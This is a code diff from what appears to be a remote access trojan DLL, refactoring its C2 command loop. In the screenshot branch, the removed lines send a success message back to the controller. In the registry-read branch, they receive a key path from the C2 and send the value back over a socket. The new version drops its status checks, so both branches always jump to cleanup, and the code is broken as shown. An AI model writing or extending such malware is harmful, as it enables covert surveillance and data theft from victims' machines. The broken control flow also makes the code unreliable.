@@ -166,103 +166,24 @@ INT startListen()
             // C2 says to take a screenshot 
             else if (strcmp((const char*)&recvBuf, SCREENSHOT) == 0)
             {
-                status = performScreenshot(clientSock);
-                if (status != SUCCESS)
+                status = handleScreenshot(clientSock);
                 {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performScreenshot %d\n", status);
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleScreenshot %d\n", status);
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
-
-                // Tell our C2 success again since we deleted the file as well...
-                status = sendSuccess(clientSock);
-                if (status != SUCCESS)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from sendSuccess %d\n", status);
-                    OutputDebugStringA(msgBuf);
-                    goto cleanup;
-                }
-
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed screenshot!\n");
             }
 
             // C2 says to read a registry key 
             else if (strcmp((const char*)&recvBuf, REGREAD) == 0)
             {
-                OutputDebugStringA("RAT-Dll-Connect::startListen - Performing registry read...\n");
-
-                // Receive our key path 
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
+                status = handleRegRead(clientSock);
                 {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (key path) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue; // keep trying to do things until we disconnect or receive a cleanup message
-                }
-
-                // Assign key path to separate buffer 
-                CHAR keyPathBuffer[DEFAULT_BUF_LEN];
-                strcpy(keyPathBuffer, recvBuf);
-
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Received key path: %s\n", keyPathBuffer);
-                OutputDebugStringA(msgBuf);
-
-                // Get the value name
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (value name) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue;
-                }
-
-                CHAR valueBuffer[DEFAULT_BUF_LEN];
-                strcpy(valueBuffer, recvBuf);
-
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Received key value: %s\n", valueBuffer);
-                OutputDebugStringA(msgBuf);
-
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing reg read on path %s with key %s...\n", keyPathBuffer, valueBuffer);
-                OutputDebugStringA(msgBuf);
-
-                void* regValue = NULL;
-
-                DWORD sizeRegValue = NULL;
-
-                status = performRegRead(keyPathBuffer, valueBuffer, &regValue, &sizeRegValue);
-                if (status != SUCCESS)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performRegRead %d\n", status);
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleRegRead %d\n", status);
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
-
-                status = sendSuccess(clientSock);
-                if (status != SUCCESS)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from sendSuccess %d\n", status);
-                    OutputDebugStringA(msgBuf);
-                    goto cleanup;
-                }
-
-                // Send back the size of the key value we read 
-                status = send(clientSock, (const char*)&sizeRegValue, sizeof(sizeRegValue), 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (sizeRegValue) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue;
-                }
-
-                // Send back key data we got
-                status = send(clientSock, (const char*)regValue, sizeRegValue, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (regValue) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue;
-                }
-
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry read!\n");
             }
         }
